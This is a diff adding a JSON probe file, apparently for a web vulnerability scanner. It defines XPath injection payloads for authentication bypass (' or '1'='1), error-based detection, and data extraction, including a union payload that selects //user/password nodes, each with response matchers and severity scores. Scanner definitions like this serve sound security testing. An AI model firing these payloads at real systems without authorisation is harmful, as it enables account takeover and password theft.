@@ -1,0 +1,95 @@
+{
+  "category": "xpath_injection",
+  "contexts": {
+    "auth_bypass": {
+      "description": "XPath injection to bypass authentication -- manipulate XPath query to return true for any user",
+      "tech_match": ["XML", "SOAP", "Java", "PHP", ".NET"],
+      "param_match": ["username", "user", "login", "password", "pass", "search", "query", "xpath"],
+      "probes": [
+        {
+          "payload": "' or '1'='1",
+          "description": "Classic XPath OR injection -- (&(user='X' or '1'='1') bypasses auth check",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "incorrect", "failed", "error"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "' or ''='",
+          "description": "Empty string equality injection -- always true condition in XPath",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "error"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "admin' or '1'='1' or 'a'='a",
+          "description": "Multi-OR injection for admin access -- ensures true regardless of password field",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "error"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "error_based": {
+      "description": "Error-based XPath injection -- trigger XPath parsing errors to confirm injection point",
+      "tech_match": ["XML", "SOAP", "Java", "PHP"],
+      "param_match": ["search", "query", "filter", "xpath", "path", "node"],
+      "probes": [
+        {
+          "payload": "'",
+          "description": "Single quote to break XPath expression -- error message confirms XPath context",
+          "matchers": [
+            {"type": "word", "words": ["xpath", "xmldocument", "expression", "predicate", "unterminated", "simplexml"], "condition": "or"},
+            {"type": "status", "status": [500]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "1 and count(/*)=1",
+          "description": "XPath function injection -- count() confirms server evaluates XPath functions",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "data_extraction": {
+      "description": "XPath injection for data extraction -- enumerate XML document structure and extract node values",
+      "tech_match": ["XML", "SOAP"],
+      "param_match": ["search", "query", "id", "name"],
+      "probes": [
+        {
+          "payload": "1] | //* | x[1",
+          "description": "Wildcard node extraction -- returns all nodes in the XML document via union operator",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 500},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "'] | //user/password | //x['",
+          "description": "Targeted password extraction -- inject union to select //user/password nodes",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        }
+      ]
+    }
+  }
+}
